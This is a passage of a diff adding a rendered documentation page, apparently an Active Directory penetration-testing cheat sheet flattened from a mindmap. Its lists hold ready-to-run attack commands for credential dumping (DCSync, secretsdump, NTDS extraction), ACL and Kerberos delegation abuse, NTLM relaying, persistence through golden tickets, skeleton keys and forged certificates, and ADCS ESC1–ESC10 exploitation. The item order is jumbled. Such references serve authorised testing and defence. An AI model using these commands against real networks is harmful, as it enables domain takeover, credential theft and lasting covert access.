+<h2 id="permissions-move">Permissions move<a class="headerlink" href="#permissions-move" title="Permanent link">¶</a></h2>
+<ul>
+<li>
+<h1 id="administrators-domain-admins-or-enterprise-admins-as-well-as-domain-controller-computer-accounts">Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts<a class="headerlink" href="#administrators-domain-admins-or-enterprise-admins-as-well-as-domain-controller-computer-accounts" title="Permanent link">¶</a></h1>
+</li>
+<li>Domain Admin</li>
+<li>Lateral move</li>
+<li><code>mimikatz lsadump::dcsync /domain:&lt;target_domain&gt; /user:&lt;target_domain&gt;\administrator</code></li>
+<li>🔥 dcsync</li>
+<li>Crack Hash</li>
+<li><code>secretsdump '&lt;domain&gt;'/'&lt;user&gt;':'&lt;password&gt;'@'&lt;domain_controller&gt;'</code></li>
+<li>Whisker.exe</li>
+<li><code>can changemsDS-KeyCredentialLInk(Generic Write) + ADCS</code></li>
+<li><code>certipy shadow auto '-u &lt;user&gt;@&lt;domain&gt;' -p &lt;password&gt; -account '&lt;target_account&gt;'</code></li>
+<li>Pass the Certificate</li>
+<li>Shadow Credentials(need ADCS)</li>
+<li><code>pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"</code></li>
+<li><code>pywhisker.py</code></li>
+<li><code>Self (Self-Membership) on Group</code></li>
+<li>GenericAll/WriteProperty on Group</li>
+<li><code>net group "&lt;group&gt;" &lt;myuser&gt; /add /domain</code></li>
+<li>ACL</li>
+<li>Add group member</li>
+<li>On Group</li>
+<li><code>WriteProperty (Self-Membership)</code></li>
+<li>WriteOwner on Group</li>
+<li>WriteDACL + WriteOwner</li>
+<li>Give yourself Generic all</li>
+<li><code>msDs-AllowedToActOnBehalf</code></li>
+<li>RBCD</li>
+<li>On Computer</li>
+<li>GenericAll / GenericWrite</li>
+<li>add Key Credentials</li>
+<li>shadow credentials</li>
+<li>change password</li>
+<li><code>net user &lt;user&gt; &lt;password&gt; /domain</code></li>
+<li>User with clear text pass</li>
+<li><code>targetedKerberoast.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt;</code></li>
+<li>hash found (TGS)</li>
+<li>add SPN (target Kerberoasting)</li>
+<li>On User</li>
+<li>logon script</li>
+<li>Access</li>
+<li>ForceChangePassword</li>
+<li><code>aclpwn.py</code></li>
+<li>ACLs/ACEspermissions</li>
+<li><code>acltoolkit &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;@&lt;target&gt; get-objectacl [-all| -object &lt;object&gt;]</code></li>
+<li>MATCH p=(g:Group)-[:ReadLAPSPassword]-&gt;(c:Computer) RETURN p</li>
+<li>who can read LAPS</li>
+<li><code>Get-LAPSPasswords -DomainController &lt;ip_dc&gt; -Credential &lt;domain&gt;\&lt;login&gt; | Format-Table -AutoSize</code></li>
+<li>get laps passwords</li>
+<li><code>foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}</code></li>
+<li>admin</li>
+<li><code>cme ldap &lt;dc_ip&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; --module laps</code></li>
+<li>use post/windows/gather/credentials/enum_laps</li>
+<li>MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]-&gt;(gp)) RETURN p</li>
+<li><code>Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=blah,DC=com" -ResolveGUIDs | ? {​​​​​​​ $_.ObjectAceType -eq "Group-Policy-Container" }​​​​​​​ | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl</code></li>
+<li>SID of principals that can create new GPOs in the domain</li>
+<li>GPO</li>
+<li><code>Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? {​​​​​​​​​​​​​ $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" }​​​​​​​​​​​​​ | select ObjectDN, SecurityIdentifier | fl</code></li>
+<li><code>return the principals that can write to the GP-Link attribute on OUs</code></li>
+<li>Generic Write on GPO</li>
+<li>Abuse GPO</li>
+<li>DNSadmins abuse(CVE-2021-40469)</li>
+<li><code>dnscmd.exe /config /serverlevelplugindll &lt;\\path\to\dll&gt; # need a dnsadmin user</code></li>
+<li>sc \DNSServer stop dnssc \DNSServer start dns</li>
+<li>Admin</li>
+</ul>
+<h2 id="domain-admin">Domain admin<a class="headerlink" href="#domain-admin" title="Permanent link">¶</a></h2>
+<ul>
+<li><code>cme smb &lt;dcip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --ntds</code></li>
+<li><code>secretsdump.py '&lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;'@&lt;ip&gt;</code></li>
+<li>Lateral move</li>
+<li>🔥dump ntds.dit</li>
+<li><code>secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract</code></li>
+<li>Crack Hash</li>
+<li>ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q</li>
+<li>windows/gather/credentials/domain_hashdump</li>
+<li><code>dpapi.py backupkeys -hashes ':&lt;hash&gt;' -t Administrator@&lt;dc_ip&gt; --export # note : dpapi.py != DonPAPI</code></li>
+<li>Credentials</li>
+<li><code>DonPAPI -pvk &lt;domain_backupkey.pvk&gt; - H ':&lt;hash&gt;' &lt;domain&gt;/&lt;user&gt;@&lt;ip_range&gt;</code></li>
+</ul>
+<h2 id="is-enterprise-admin">Is enterprise admin ?<a class="headerlink" href="#is-enterprise-admin" title="Permanent link">¶</a></h2>
+<ul>
+<li>GG good luck for the report !</li>
+<li>Enterprise Admin</li>
+</ul>
+<h2 id="persistence">Persistence<a class="headerlink" href="#persistence" title="Permanent link">¶</a></h2>
+<ul>
+<li>net group "domain admins" myuser /add /domain</li>
+<li><code>ticketer.py -aesKey &lt;aeskey&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain&gt; &lt;anyuser&gt;</code></li>
+<li>Golden ticket</li>
+<li><code>mimikatz "kerberos::golden /user:&lt;admin_user&gt; /domain:&lt;domain&gt; /sid:&lt;domain-sid&gt;/aes256:&lt;krbtgt_aes256&gt; /ptt"</code></li>
+<li><code>mimikatz "kerberos::golden /sid:&lt;current_user_sid&gt; /domain:&lt;domain-sid&gt; /target:&lt;target_server&gt; /service:&lt;target_service&gt; /aes256:&lt;computer_aes256_key&gt; /user:&lt;any_user&gt; /ptt"</code></li>
+<li>Silver Ticket</li>
+<li><code>ticketer.py -nthash &lt;machine_nt_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain&gt; &lt;anyuser&gt;</code></li>
+<li>Diamond ticket</li>
+<li>Saphire Ticket</li>
+<li><code>PowerShell New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD</code></li>
+<li>Directory Service Restore Mode (DSRM)</li>
+<li><code>mimikatz "privilege::debug" "misc::skeleton" "exit"</code></li>
+<li>Skeleton Key</li>
+<li>password is mimikatz</li>
+<li><code>mimikatz "privilege::debug" "misc::memssp" "exit"</code></li>
+<li>Custom SSP</li>
+<li>C:\Windows\System32\kiwissp.log</li>
+<li><code>certipy forge -ca-pfx &lt;ca_private_key&gt; -upn &lt;user&gt;@&lt;domain&gt; -subject 'CN=&lt;user&gt;,CN=Users,DC=&lt;CORP&gt;,DC=&lt;LOCAL&gt;</code></li>
+<li><code>certipy ca -backup -ca '&lt;ca_name&gt;' -username &lt;user&gt;@&lt;domain&gt; -hashes &lt;hash&gt;</code></li>
+<li>Golden certificate</li>
+<li>DC shadow</li>
+<li>Acl manipulation</li>
+<li>...</li>
+</ul>
+<h2 id="kerberos-delegation-move">Kerberos Delegation move<a class="headerlink" href="#kerberos-delegation-move" title="Permanent link">¶</a></h2>
+<ul>
+<li><code>Get-NetComputer -Unconstrained</code></li>
+<li><code>Get-DomainComputer -Unconstrained -Properties DnsHostName</code></li>
+<li>Get unconstrained delegation machines</li>
+<li>MATCH (c:Computer {unconstraineddelegation:true}) RETURN c</li>
+<li>MATCH (u:User {owned:true}), (c:Computer {unconstraineddelegation:true}), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p</li>
+<li>Unconstrained delegation</li>
+<li><code>privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export</code></li>
+<li>Kerberos TGT</li>
+<li>Get tickets</li>
+<li>Rubeus dump /service:krbtgt /nowrap</li>
+<li>UAC: ADS_UF_TRUSTED_FOR_DELEGATION</li>
+<li>Rubeus dump /luid:0xdeadbeef /nowrap</li>
+<li>if dc</li>
+<li>Rubeus monitor /interval:5</li>
+<li>Pass The Ticket</li>
+<li>DCSync</li>
+<li>DomAdmin</li>
+<li>(Force_connection_with_coerced_auth)</li>
+<li><code>Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo</code></li>
+<li><code>Get-DomainUser -TrustedToAuth</code></li>
+<li>Get constrained delegation</li>
+<li>MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]-&gt;(t)) RETURN p</li>
+<li><code>MATCH (u:User {owned:true}), (c:Computer {name: "&lt;MYTARGET.FQDN&gt;"}), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p</code></li>
+<li><code>Rubeus hash /password:&lt;password&gt;</code></li>
+<li><code>With protocol transition (any)Object: msDS-AllowedToDelegateToUAC: TRUST_TO_AUTH_FOR_DELEGATION</code></li>
+<li>HOST</li>
+<li><code>psexec \\\&lt;target&gt; &lt;cmd&gt;</code></li>
+<li>Kerberos Delegation</li>
+<li><code>Enter-Pssession -computername &lt;target&gt;</code></li>
+<li><code>Rubeus s4u /ticket:&lt;ticket&gt; /impersonateuser:&lt;admin_user&gt; /msdsspn:&lt;spn_constrained&gt; /altservice:CIFS /ptt</code></li>
+<li>HTTP</li>
+<li><code>Rubeus asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;AES 256 hash&gt;</code></li>
+<li>Constrained delegation</li>
+<li>Altservice</li>
+<li><code>Invoke-Command &lt;target&gt; -Scriptblock {&lt;cmd&gt;}</code></li>
+<li>Kerberos TGS</li>
+<li>CIFS</li>
+<li><code>dir \\&lt;target&gt;\c$</code></li>
+<li>LDAP</li>
+<li><code>rbcd.py -delegate-from '&lt;rbcd_com&gt;$' -delegate-to '&lt;constrained&gt;$' -dc-ip'&lt;dc&gt;' -action 'write' -hashes '&lt;hash&gt;'&lt;domain&gt;/&lt;constrained&gt;$</code></li>
+<li><code>getST.py -spn host/&lt;constrained&gt; -hashes '' '&lt;domain&gt;/&lt;computer_account&gt;' -impersonate Administrator --dc-ip &lt;dc_ip&gt; -additional-ticket &lt;previous_ticket&gt;</code></li>
+<li><code>getST.py -spn &lt;constrained_spn&gt;/&lt;target&gt; -hashes '&lt;hash&gt;' '&lt;domain&gt;/&lt;constrained&gt;$' -impersonate Administrator --dc-ip &lt;dc_ip&gt; -additional-ticket &lt;previous_ticket&gt;</code></li>
+<li><code>addcomputer.py -computer-name '&lt;rbcd_com&gt;$' -computer-pass '&lt;rbcd_compass&gt;' -dc-ip &lt;dc&gt; '&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;'</code></li>
+<li><code>getST.py -self -impersonate "administrator" -dc-ip &lt;ip&gt; &lt;domain&gt;/&lt;rbcd_com&gt;$':'&lt;rbcd_compass&gt;'</code></li>
+<li><code>Without protocol transition (kerberos only)Object: msDS-AllowedToDelegateToUAC: TRUSTED_FOR_DELEGATION</code></li>
+<li>RBCD</li>
+<li>self RBCD</li>
+<li><code>rubeus.exe s4u /user:&lt;fake_computer$&gt; /aes256:&lt;AES 256 hash&gt; /impersonateuser:administrator /msdsspn:cifs/&lt;victim.domain.local&gt; /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt</code></li>
+<li>Admin</li>
+<li><code>rubeus.exe hash /password:&lt;computer_pass&gt; /user:&lt;computer&gt; /domain:&lt;domain&gt;</code></li>
+<li><code>rbcd.py -delegate-from '&lt;computer&gt;$' -delegate-to '&lt;target&gt;$' -dc-ip'&lt;dc&gt;' -action 'write'&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;</code></li>
+<li><code>getST.py -spn host/&lt;dc_fqdn&gt; '&lt;domain&gt;/&lt;computer_account&gt;:&lt;computer_pass&gt;' -impersonate Administrator --dc-ip &lt;dc_ip&gt;</code></li>
+<li><code>Object: msDS-AllowedToActOnBehalfOfOtherIdentit</code></li>
+<li><code>Resource-Based Constrained Delegation (RBCD)</code></li>
+<li><code>addcomputer.py -computer-name '&lt;computer_name&gt;' -computer-pass '&lt;ComputerPassword&gt;' -dc-host &lt;dc&gt; -domain-netbios &lt;domain_netbios&gt; '&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;'</code></li>
+<li>add computer account</li>
+</ul>
+<h2 id="mitm-listen-and-relay">MITM (Listen and relay)<a class="headerlink" href="#mitm-listen-and-relay" title="Permanent link">¶</a></h2>
+<ul>
+<li>(MITM)Listen and Relay</li>
+</ul>
+<h3 id="listener">Listener<a class="headerlink" href="#listener" title="Permanent link">¶</a></h3>
+<ul>
+<li>NetNtlmv1</li>
+<li><code>🔥 responder -I eth0 (use --lm to force lm downgrade)</code></li>
+<li>NetNtlmv2</li>
+<li>Listen</li>
+<li><code>smbclient.py</code></li>
+<li>User</li>
+</ul>
+<h3 id="ntlm-relay">NTLM Relay<a class="headerlink" href="#ntlm-relay" title="Permanent link">¶</a></h3>
+<ul>
+<li>use exploit/windows/smb/smb_relay #windows200 / windows server2008</li>
+<li>Admin</li>
+<li>relay on itself</li>
+<li>MS08-068</li>
+<li>NetNTLMv1</li>
+<li>remove mic</li>
+<li><code>ntlmrelayx.py --remove-mic --escalate-user &lt;user&gt; -t ldap://&lt;dc_fqdn&gt; -smb2support</code></li>
+<li>DcSync</li>
+<li>SMB -&gt; LDAP(S)</li>
+<li><code>ntlmrelayx.py -t ldaps://&lt;dc&gt; --remove-mic --add-computer &lt;computer_name&gt; &lt;computer_password&gt; --delegate-access -smb2support</code></li>
+<li>RBCD</li>
+<li>NetNTLMv2</li>
+<li>remove mic (CVE-2019-1040)</li>
+<li>relay to LDAP</li>
+<li><code>ntlmrelayx -t ldap://&lt;dc&gt; --shadow-credentials --shadow-target '&lt;dc&gt;'</code></li>
+<li>shadow credentials</li>
+<li>HTTP(S) -&gt; LDAP</li>
+<li><code>nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK</code></li>
+<li>Find SMB not signed (default on non DC)</li>
+<li>use exploit/windows/smb/smb_relay</li>
+<li>NTLM relay</li>
+<li><code>cme smb $hosts --gen-relay-list relay.txt</code></li>
+<li>SMB unsigned</li>
+<li><code>ntlmrelayx.py -wh &lt;attacker_ip&gt; -t smb://&lt;target&gt; -l /tmp -6 -debug</code></li>
+<li>-&gt; SMB</li>
+<li>User</li>
+<li><code>🔥ntlmrelayx.py -tf targets.txt -smb2support -socks (-6)</code></li>
+<li>lateral move (socks)</li>
+<li>http ADCS web</li>
+<li>ESC8</li>
+<li>-&gt; HTTP</li>
+<li>sccm ntlm relay attack</li>
+<li><code>ntlmrelayx.py -t mssql://&lt;ip&gt; -smb2support –socks</code></li>
+<li>relay to mssql</li>
+<li>-&gt; MSSQL</li>
+<li><code>ntlmrelayx.py -t dcsync://&lt;dc_02_ip&gt; -smb2support -auth-smb &lt;user&gt;:&lt;password&gt;</code></li>
+<li>coerce come from dc01, relay to dc02</li>
+<li>SMB -&gt; Netlogon</li>
+<li><code>Zero-Logon (safe method)(CVE-2020-1472)</code></li>
+</ul>
+<h3 id="arp-poisoning">Arp poisoning<a class="headerlink" href="#arp-poisoning" title="Permanent link">¶</a></h3>
+<ul>
+<li><code>pywsus.py</code></li>
+<li>wsus relay</li>
+</ul>
+<h2 id="weak-adcs-configuration">Weak ADCS configuration<a class="headerlink" href="#weak-adcs-configuration" title="Permanent link">¶</a></h2>
+<ul>
+<li><code>Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt</code></li>
+<li><code>ntlmrelayx.py -t http://&lt;dc_ip&gt;/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController</code></li>
+<li><code>gettgtpkinit.py -pfx-base64 $(cat cert.b64) &lt;domain&gt;/&lt;dc_name&gt;$ &lt;ccache_file&gt;</code></li>
+<li>Pass the ticket</li>
+<li>DCSync</li>
+<li>DomAdmin</li>
+<li>Web enrollement is up</li>
+<li>🔥ESC8</li>
+<li><code>certipy relay -ca &lt;ca_ip&gt; -template DomainController</code></li>
+<li><code>certipy auth -pfx &lt;certificate&gt; -dc-ip &lt;dc_ip&gt;</code></li>
+<li><code>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template '&lt;vulnerable template name&gt;' -ca &lt;ca_name&gt; -upn &lt;target_user&gt;@&lt;domain&gt;</code></li>
+<li>Pass the certificate</li>
+<li>ESC1 (Request a certificate from a vulnerable template)</li>
+<li><code>certify.exe request /ca:&lt;server&gt;\&lt;ca-name&gt; /template:"&lt;vulnerable template name&gt;" [/altname:"Admin"]</code></li>
+<li><code>certutil -v -dsTemplate</code></li>
+<li>ESC2</li>
+<li>certify.exe find [ /vulnerable]</li>
+<li>Get templates information</li>
+<li>Misconfigured Certificate Templates</li>
+<li><code>certify.exe request request /ca:&lt;server&gt;\&lt;ca-name&gt; /template:&lt;template&gt; /onbehalfof:&lt;domain&gt;\&lt;user&gt; /enrollcert:&lt;path.pfx&gt; [/enrollcertpw:&lt;cert-password&gt;]</code></li>
+<li><code>certipy find -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -dc-ip &lt;domaincontroller&gt;</code></li>
+<li><code>certify.exe request /ca:&lt;server&gt;\&lt;ca-name&gt; /template:"&lt;vulnerable template name&gt;"</code></li>
+<li>ESC3 (Use an enrollement agent to request a certificate)</li>
+<li><code>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template '&lt;vulnerable template name&gt;' -ca &lt;ca_name&gt; -on-behalf-of '&lt;domain&gt;\&lt;user&gt;' -pfx &lt;cert&gt;</code></li>
+<li><code>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template '&lt;vulnerable template name&gt;' -ca &lt;ca_name&gt;</code></li>
+<li><code>certipy template -u &lt;user&gt;@&lt;domain&gt; -p '&lt;password&gt;' -template &lt;vuln_template&gt; -configuration &lt;template&gt;.json</code></li>
+<li>restore template</li>
+<li><code>certipy template -u &lt;user&gt;@&lt;domain&gt; -p '&lt;password&gt;' -template &lt;vuln_template&gt; -save-old -debug</code></li>
+<li>ESC1 on vulnerable template</li>
+<li>write privilege over a certificate template</li>
+<li>ESC4</li>
+<li>ADCS weak configuration</li>
+<li><code>certipy ca -ca &lt;ca_name&gt; -add-officer '&lt;user&gt;' -username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt;</code></li>
+<li>Misconfigured ACL</li>
+<li><code>certipy ca -u &lt;user&gt;@&lt;domain&gt; -p '&lt;password&gt;' -ca &lt;ca_name&gt; -issue-request &lt;request_id&gt;</code></li>
+<li><code>certipy req -u &lt;user&gt;@&lt;domain&gt; -p '&lt;password&gt;' -ca &lt;ca_name&gt; -retreive &lt;request_id&gt;</code></li>
+<li>getACL information</li>
+<li>Manage CA</li>
+<li>Issue request</li>
+<li>ESC7</li>
+<li><code>certipy req -username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt; -ca &lt;ca_name&gt; -template '&lt;vulnerable template name&gt;' -upn '&lt;target_user&gt;'</code></li>
+<li><code>certipy ca -ca &lt;ca_name&gt; -enable-template '&lt;ecs1_vuln_template&gt;'-username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt;</code></li>
+<li>Manage certificate</li>
+<li>error, but save private key</li>
+<li><code>certutil -TCAInfo</code></li>
+<li>Display CA information</li>
+<li>certify.exe cas</li>
+<li>Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CAyou can choose any certificate template that permits client authentication</li>
+<li>ESC1</li>
+<li><code>certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"</code></li>
+<li>Misconfigured CA</li>
+<li>ESC6</li>
+<li>Get CA flags (if remote registry is enabled)</li>
+<li>certipy / certify.exe (only the flag ATTRIBUTESUBJECTALTNAME2)</li>
+<li>Get PKI objects information</li>
+<li>certify.exe pkiobjects</li>
+<li>vulnerable PKI Object access control</li>
+<li>ESC5</li>
+<li>ACL</li>
+<li><code>certipy req -username &lt;accountB&gt;@&lt;domain&gt; -hashes &lt;hashB&gt; -ca &lt;ca_name&gt; -template &lt;vulnerable template&gt;</code></li>
+<li>ESC9</li>
+<li><code>certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn Administrator</code></li>
+<li><code>certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn &lt;accountB&gt;@&lt;domain&gt;</code></li>
+<li>ESC9/ESC10 (Case 1)</li>
+<li>[Kerberos Mapping] ESC9/ESC10(Case 1)</li>
+<li><code>certipy req -username &lt;accountB&gt;@&lt;domain&gt; -hashes &lt;hashB&gt; -ca &lt;ca_name&gt; -template &lt;any template with client auth&gt;</code></li>
+<li>Reset accountB UPN</li>
+<li><code>certipy shadow auto -username &lt;accountA&gt;@&lt;domain&gt; -p &lt;passA&gt; -account &lt;accountB&gt;</code></li>
+<li>ESC10 (Case 1)</li>
+<li>[Schannel Mapping] ESC9/ESC10 (Case 2)</li>
+<li>Misconfigured Certificate Mapping (blind test)</li>
+<li>ESC9/ESC10</li>
+<li><code>certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn '&lt;dc_name$&gt;@&lt;domain&gt;'</code></li>
+<li>ESC10 (Case 2)</li>
+</ul>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="October 14, 2026 18:40:22 UTC">October 14, 2026</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden="">
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.path", "navigation.indexes", "navigation.tabs", "navigation.sections", "navigation.top", "search.highlight", "content.code.copy", "content.code.annotate", "content.tooltips", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  
+<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(()=>{ lightbox.reload(); });
+</script></body></html>
